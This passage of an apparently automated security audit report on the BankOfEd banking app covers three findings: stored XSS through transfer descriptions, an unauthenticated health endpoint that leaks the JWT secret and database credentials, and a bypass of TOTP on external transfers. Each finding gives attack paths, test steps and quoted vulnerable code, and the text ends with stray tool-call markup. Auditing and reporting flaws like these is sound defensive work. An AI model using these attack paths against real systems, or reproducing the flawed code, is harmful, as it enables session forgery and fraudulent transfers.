    "Attacker sets malicious description via transfer (validated only for length)",
    "Value persisted without HTML sanitization",
    "Targeted user views dashboard recent-transactions widget",
    "dashboard.js inserts (tx.description || tx.type) into innerHTML unescaped",
    "Script executes in victim's session"
  ],
  "impact": "Insufficient server-side sanitization of transfer descriptions is the shared root cause enabling stored XSS wherever the field is later rendered unescaped, including the dashboard widget.",
  "severity_reasoning": "Medium: same vulnerability class as other description-XSS findings but with lower discovery confidence regarding cross-user reachability specifically via the dashboard path.",
  "dynamic_test": "Set a transaction description with a script payload via a transfer that is visible on the dashboard for a targeted user (e.g. via an account-scoped path); load the dashboard as that user and confirm execution."
}
```

#### Validator reasoning

Code review confirms the core defect: dashboard.js renderTransactions() builds `container.innerHTML = html` where `tx.description` is concatenated raw at line 91 without any call to `U.escapeHtml` (which exists and is used elsewhere in the same file for `acc.account_name`, `acc.bsb`, `acc.account_number`). Server-side, TransactionController::transferOwn/transferExternal validate description only with `string|max:255` (TransactionController.php:58/88) — no HTML sanitization — and TransferService/Transaction::create persist the raw string (Transaction.php:88-108). Transaction::format() returns the raw description untouched (Transaction.php:121), so the API genuinely serves unescaped, attacker-influenceable HTML/JS to the client, and the client sink performs no output encoding. This is a real, demonstrable missing-output-encoding defect (A03) satisfying a concrete source (user-supplied description at transfer time) → sink (unescaped innerHTML assignment) path with no escaping and no CSP/sanitization control in between.

However, I traced the specific reachable data for THIS file's call (`Api.getTransactions({ per_page: 10 })`, no account_id) into Transaction::findByUser (Transaction.php:31-77): when `$accountId` is null, the query is `JOIN accounts a ON t.from_account_id = a.id WHERE a.user_id = ?`, i.e. it only returns transactions where the viewing user's own account is the SENDER. There are no joint accounts (accounts.user_id is 1:1, confirmed via Account.php model — no account_users/joint schema found), so every description rendered by dashboard.js at this exact code path was authored by the viewing user themselves when they initiated the transfer. This means the specific sink at dashboard.js:91, as currently wired, only ever displays self-authored content — it is reachable as self-XSS, not as a cross-user attacker→victim stored-XSS through this file. Genuine cross-user reachability of the same unescaped field is demonstrated only at a different location (accounts.js, `account_id`-filtered query, which does include incoming transactions and is also unescaped) — which the candidate cites as supporting evidence but which is a distinct code location/citation, not this one.

Net: the unescaped-sink defect at dashboard.js:91 is real and confirmed as code fact (missing encoding, verified end-to-end from validator to sink), so I confirm the underlying vulnerability. But the "high severity"/"exploitable" cross-user attacker-to-victim narrative specifically anchored to this location is not established — only self-XSS is demonstrated through this exact file, which the candidate's own proof_gaps entry already flags as unresolved. Severity/impact for this specific citation should be treated as weaker than claimed.

#### Code evidence

```
// dashboard.js
txns.forEach(function (tx) {
  ...
  html +=
    '<div class="tx-row flex items-center gap-4 px-6 py-4">' +
      icon +
      '<div class="flex-1 min-w-0">' +
        '<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>' +
        ...
});
container.innerHTML = html;

// TransferService::transferExternal — description stored with no sanitization
$txnId = Transaction::create([... 'description' => $description, ...]);

// accounts.js — cross-account reachable sink for the same field
'<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>'
```

## 95. Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials — Endpoint is not gated behind authentication despite exposing sensitive configura

- Lead reference: PWNJ-095
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false)
- Fingerprint: 6c5436b4fe5ba2b32dbfd5ec6d697ceae43bbaaeb23c02dd1e50f854a643745a

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false)
```

#### Controls encountered

```
[
  "None - route explicitly configured with 'auth' => false, and dispatch() only calls auth middleware when auth is true/'machine'"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found; the route is genuinely public and the handler unconditionally returns secrets",
  "No reverse proxy, WAF, or environment-specific gating for this route is visible in the reviewed code"
]
```

#### Proof gaps

```
[
  "Cannot fully confirm production deployment environment variables (actual JWT_SECRET/DB_* values) since config/app.php falls back to defaults only when env vars are unset — but this does not diminish exploitability, since whatever secret is configured is leaked regardless of its value",
  "Did not verify whether an upstream reverse proxy/API gateway blocks /api/health in production, which is outside the scope of the source code reviewed"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "Router.php registers GET /api/health with 'auth'=>false despite returning sensitive config",
    "Router::health() executes without any AuthMiddleware check",
    "jwt_secret, db_host, db_name, db_user returned in JSON",
    "Attacker forges session tokens using leaked secret"
  ],
  "impact": "The endpoint's lack of any authentication gate is the direct root enabler for public disclosure of the JWT secret and DB credentials, leading to full session forgery.",
  "severity_reasoning": "High: root-cause missing access control on a route exposing critical secrets, enabling full authentication bypass.",
  "dynamic_test": "curl -s https://target/api/health and confirm no Authorization header is required for the endpoint to return sensitive configuration including jwt_secret/db_*."
}
```

#### Validator reasoning

The /api/health route is registered with 'auth' => false in Router::dispatch(), and Router::dispatch() only invokes AuthMiddleware::handle() when $requiresAuth === true (or MachineAuthMiddleware when 'machine'), so no authentication check runs before Router::health() executes. Router::health() loads config/app.php (which itself loads secrets from environment variables via getenv(), falling back to hardcoded dev defaults such as 'bankofed-dev-secret-change-in-production') and passes db_host, db_name, db_user, and jwt_secret directly into Response::success(), which JSON-encodes the array verbatim and echoes it to the client. There is no redaction, allow-list, or sanitization of these fields anywhere in the call path. Any unauthenticated client issuing GET /api/health therefore receives the live jwt_secret and DB connection details in the HTTP response body. Since AuthMiddleware presumably uses this same jwt_secret (per config/app.php) to sign/verify JWTs, obtaining it enables forging arbitrary session tokens, and the DB details aid further lateral attacks. This is a complete, concrete source-to-sink path with no mitigating control.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 96. TOTP/2FA bypass: external transfers proceed without TOTP when user has not enabled 2FA — Fail-open TOTP enforcement when totp_code is omitted even though 2FA is enabled

- Lead reference: PWNJ-096
- Category: A07
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:238-247
- Fingerprint: a25aa989bda136e8d66d1b50b0c98a26ad2bce5c11a3fd6057fb8db48efe3c1d

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/TransferService.php:238-247
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify runtime behavior via test harness/DB; assessment based on static code reading only, but logic is unambiguous and self-contained within the two files reviewed"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with stolen/forged bearer token for a 2FA-enabled victim",
    "POST /api/transfers/external with totp_code omitted/empty",
    "TransferService::checkTotpRequired() flags transfer as requiring TOTP",
    "transferExternal(): elseif (!empty($totpCode)) branch skipped when totp_code is empty; $totpVerified stays false",
    "Transfer proceeds without any code verification despite being flagged as TOTP-required"
  ],
  "impact": "Even when 2FA is enabled, omitting the totp_code field entirely skips verification and lets the transfer proceed, allowing an attacker holding a stolen bearer token to bypass 2FA on external transfers.",
  "severity_reasoning": "High: fail-open logic on a 2FA control for financial transfers, enabling fraud even against victims who have enabled TOTP.",
  "dynamic_test": "As a user with totp_enabled=true, initiate an external transfer requiring TOTP but send the request with totp_code omitted (empty/null); confirm the transfer completes successfully despite no valid code being supplied."
}
```

#### Validator reasoning

Reviewed TransferService::transferExternal (lines ~230-246) and its caller TransactionController::transferExternal. The controller only validates from_account_id, amount, description, and either address_book_id or to_bsb/to_account_number — totp_code is entirely optional in the request validator (`'totp_code' ?? null`), with no rule requiring it. checkTotpRequired() correctly flags manual entries and first-time address-book payees as requiring TOTP ('required' => true). However in transferExternal():
```
if ($totpCheck['required']) {
    if (!$user['totp_enabled']) {
        $totpVerified = false;           // proceeds anyway, no enforcement
    } elseif (!empty($totpCode)) {
        // verify code, else Response::forbidden
        $totpVerified = true;
    }
    // if totp_enabled is true AND totpCode is empty/null, neither branch executes -> silently proceeds with totpVerified=false
}
```
There is no `else`/`Response::forbidden` for the omitted-code case when totp_enabled is true, and no enforcement at all when totp_enabled is false. Execution simply continues to debit/credit the accounts and create the completed transaction — the TOTP requirement is entirely bypassable by omitting totp_code from the JSON body, or trivially bypassable if the user never enabled TOTP. No other middleware, route guard, or validator in Router.php/TransactionController.php enforces TOTP before this code executes; the only route guard is 'auth' => true (session auth), unrelated to 2FA. This is a genuine fail-open logic flaw, matching the source-to-sink path: attacker-controlled request (totp_code omitted or absent) -> checkTotpRequired flags required=true -> both bypass branches skip verification -> Transaction::create commits the completed external transfer.</reasoning>
<parameter name="controls">["Route requires session auth ('auth' => true) but this only authenticates the caller, not their intended second factor for high-risk transfers", "Validator::make enforces basic field presence/format but has no rule requiring totp_code even when transfer_type indicates TOTP is required"]
